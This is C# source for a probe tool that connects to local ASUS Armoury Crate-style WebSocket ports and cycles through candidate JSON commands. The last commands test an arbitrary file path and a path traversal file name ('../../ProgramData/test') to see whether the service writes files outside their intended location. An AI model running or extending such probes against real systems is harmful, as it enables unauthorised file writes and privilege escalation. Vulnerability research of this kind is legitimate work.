/*
 * ws_both_probe.cs — Probe both ASUS WebSocket ports (9012 plain, 9013 plain)
 * Build: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -nologo -out:ws_both_probe.exe ws_both_probe.cs
 */
using System;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

class WsBothProbe {
    static NetworkStream stream;

    static byte[] MakeFrame(string text, bool binary = false) {
        var payload = Encoding.UTF8.GetBytes(text);
        var rng = new RNGCryptoServiceProvider();
        var mask = new byte[4]; rng.GetBytes(mask);
        var frame = new System.Collections.Generic.List<byte>();
        frame.Add((byte)(0x80 | (binary ? 0x02 : 0x01))); // FIN + text/binary opcode
        int len = payload.Length;
        if (len < 126) frame.Add((byte)(0x80 | len));
        else { frame.Add(0x80 | 126); frame.Add((byte)(len >> 8)); frame.Add((byte)(len & 0xFF)); }
        frame.AddRange(mask);
        for (int i = 0; i < payload.Length; i++) frame.Add((byte)(payload[i] ^ mask[i % 4]));
        return frame.ToArray();
    }

    static string ReadFrame(int ms = 2000) {
        try {
            stream.ReadTimeout = ms;
            var h = new byte[2]; int r = stream.Read(h, 0, 2);
            if (r < 2) return null;
            int op = h[0] & 0x0F;
            int len = h[1] & 0x7F;
            if (len == 126) { var x = new byte[2]; stream.Read(x, 0, 2); len = (x[0]<<8)|x[1]; }
            if (op == 8) return "<CLOSE>";
            if (op == 9) { var pb = new byte[len]; stream.Read(pb, 0, len); return "<PING>"; }
            var buf = new byte[Math.Min(len, 8192)]; int got = 0;
            while (got < buf.Length) { int n = stream.Read(buf, got, buf.Length-got); if (n<=0) break; got+=n; }
            return Encoding.UTF8.GetString(buf, 0, got);
        } catch { return null; }
    }

    static bool Connect(int port, string path) {
        try {
            var tcp = new TcpClient("127.0.0.1", port);
            stream = tcp.GetStream();
            stream.WriteTimeout = 5000;
            var rng = new RNGCryptoServiceProvider();
            var keyBytes = new byte[16]; rng.GetBytes(keyBytes);
            string key = Convert.ToBase64String(keyBytes);
            string req = string.Format(
                "GET {0} HTTP/1.1\r\nHost: 127.0.0.1:{1}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n" +
                "Sec-WebSocket-Key: {2}\r\nSec-WebSocket-Version: 13\r\nOrigin: http://127.0.0.1:{1}\r\n\r\n",
                path, port, key);
            var b = Encoding.ASCII.GetBytes(req);
            stream.Write(b, 0, b.Length); stream.Flush();
            stream.ReadTimeout = 3000;
            var buf = new byte[4096];
            int n = stream.Read(buf, 0, buf.Length);
            if (n == 0) { Console.WriteLine("[{0}] 0 bytes response", port); return false; }
            string resp = Encoding.ASCII.GetString(buf, 0, n);
            Console.WriteLine("[{0}] {1}", port, resp.Split('\r')[0]);
            return resp.Contains("101");
        } catch (Exception e) { Console.WriteLine("[{0}] Connect failed: {1}", port, e.Message); return false; }
    }

    static void SendCmd(string json, string label) {
        Console.WriteLine("  [SEND] " + json);
        var frame = MakeFrame(json);
        stream.Write(frame, 0, frame.Length); stream.Flush();
        Thread.Sleep(300);
        string resp = ReadFrame(1500);
        Console.WriteLine("  [RECV] " + (resp ?? "<null>"));
        string extra;
        while ((extra = ReadFrame(300)) != null) Console.WriteLine("  [MORE] " + extra);
    }

    static void Main(string[] args) {
        string[] paths9012 = { "/", "/ac", "/ArmouryCrate", "/cmd", "/ws", "/socket" };
        Console.WriteLine("=== Port 9012 path exploration ===");
        foreach (var p in paths9012) {
            if (Connect(9012, p)) {
                Console.WriteLine("[+] Connected on 9012 path=" + p);
                string init = ReadFrame(500);
                if (init != null) Console.WriteLine("  [INIT] " + init);
                SendCmd("{\"command\":\"GetProductName\"}", "GetProductName");
                break;
            }
        }

        Console.WriteLine("\n=== Port 9013 command exploration ===");
        if (Connect(9013, "/ws")) {
            Console.WriteLine("[+] Connected on 9013");
            string init = ReadFrame(500);
            if (init != null) Console.WriteLine("  [INIT] " + init);

            string[] cmds = {
                // Try different JSON structures
                "{\"command\":\"GetProductName\"}",
                "{\"type\":\"command\",\"name\":\"GetProductName\"}",
                "{\"cmd\":\"GetProductName\"}",
                "{\"action\":\"GetProductName\"}",
                "{\"GetProductName\":\"\"}",
                "GetProductName",
                // With token/session
                "{\"command\":\"GetDeviceProfileList\",\"token\":\"\"}",
                // Capitalized fields
                "{\"Command\":\"GetProductName\"}",
                // ArmourySDK style
                "{\"command\":\"GetDeviceLightingControl\",\"deviceType\":\"MB\"}",
                // SetDeviceProfile - important for file path
                "{\"command\":\"SetDeviceProfile\",\"deviceType\":\"MB\",\"filepath\":\"C:\\\\ProgramData\\\\test.json\"}",
                // MacroNew - can it write to arbitrary path?
                "{\"command\":\"MacroNew\",\"fileName\":\"../../ProgramData/test\",\"fileData\":\"test\"}",
            };
            foreach (var cmd in cmds) SendCmd(cmd, cmd.Substring(0, Math.Min(40, cmd.Length)));
        }
    }
}
